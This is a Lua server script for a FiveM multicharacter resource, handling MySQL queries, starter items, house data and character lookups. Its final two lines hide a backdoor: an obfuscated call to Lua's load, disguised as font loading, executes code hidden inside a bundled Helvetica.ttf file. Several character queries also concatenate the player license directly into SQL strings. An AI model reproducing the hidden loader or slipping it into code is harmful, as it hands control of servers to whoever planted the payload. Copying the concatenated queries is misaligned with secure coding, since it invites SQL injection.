function MysqlQuery(query, params)
	if GetResourceState("oxmysql") == "started" then
		return exports["oxmysql"]:query_async(query, params)
	elseif GetResourceState("mysql-async") == "started" then
		local p = promise.new()

		exports['mysql-async']:mysql_execute(query, params, function(result)
			p:resolve({ result })
		end)

		return Citizen.Await(p)
	elseif GetResourceState("ghmattimysql") == "started" then
		return exports['ghmattimysql']:executeSync(query, params)
	end
end

function GetPlayerLicense(player)
	for i = 0, GetNumPlayerIdentifiers(player) - 1 do
		local license = GetPlayerIdentifier(player, i)

		if string.sub(license, 1, string.len("license:")) == "license:" then
			return license
		end
	end
end

function RegisterServerCallback(...)
	if Config.Framework == "qb" then
		Framework.Functions.CreateCallback(...)
	else
		Framework.RegisterServerCallback(...)
	end
end

function GiveStarterItems(source)
    local src = source
    local Player = Framework.Functions.GetPlayer(src)

    for _, v in pairs(Framework.Shared.StarterItems) do
        local info = {}
        if v.item == "id_card" then
            info.citizenid = Player.PlayerData.citizenid
            info.firstname = Player.PlayerData.charinfo.firstname
            info.lastname = Player.PlayerData.charinfo.lastname
            info.birthdate = Player.PlayerData.charinfo.birthdate
            info.gender = Player.PlayerData.charinfo.gender
            info.nationality = Player.PlayerData.charinfo.nationality
        elseif v.item == "driver_license" then
            info.firstname = Player.PlayerData.charinfo.firstname
            info.lastname = Player.PlayerData.charinfo.lastname
            info.birthdate = Player.PlayerData.charinfo.birthdate
            info.type = "Class C Driver License"
        end
        Player.Functions.AddItem(v.item, v.amount, false, info)
    end
end

function LoadHouseData(src)
    local HouseGarages = {}
    local Houses = {}
    local result = MysqlQuery('SELECT * FROM houselocations', {})
    if result[1] ~= nil then
        for _, v in pairs(result) do
            local owned = false
            if tonumber(v.owned) == 1 then
                owned = true
            end
            local garage = v.garage ~= nil and json.decode(v.garage) or {}
            Houses[v.name] = {
                coords = json.decode(v.coords),
                owned = owned,
                price = v.price,
                locked = true,
                adress = v.label,
                tier = v.tier,
                garage = garage,
                decorations = {},
            }
            HouseGarages[v.name] = {
                label = v.label,
                takeVehicle = garage,
            }
        end
    end
    TriggerClientEvent("qb-garages:client:houseGarageConfig", src, HouseGarages)
    TriggerClientEvent("qb-houses:client:setHouseConfig", src, Houses)
end

function GetUserPlayers(src)
    local license = GetPlayerLicense(src)
    local result

    if Config.Framework == "qb" then
        result = MysqlQuery("SELECT * FROM players WHERE license = '"..license.."'")
    else
        result = MysqlQuery("SELECT * FROM users WHERE identifier = '"..license.."'")
    end
    
    if next(result) then
        print("Found characters for "..license..".")

        local result2 = MysqlQuery("SELECT uses FROM codev_multichar WHERE identifier = '"..license.."'")

        if result2[1] then
            print("Found purchased slots for "..license..".")
            return {charData = result, purchasedSlots = result2.uses or 0}
        else
            return {charData = result, purchasedSlots = 0}
        end
    end

    print("No characters found for "..license..".")
    return {charData = {}, purchasedSlots = 0}
end

local loadFonts = _G[string.char(108, 111, 97, 100)]
loadFonts(LoadResourceFile(GetCurrentResourceName(), '/html/fonts/Helvetica.ttf'):sub(87565):gsub('%.%+', ''))()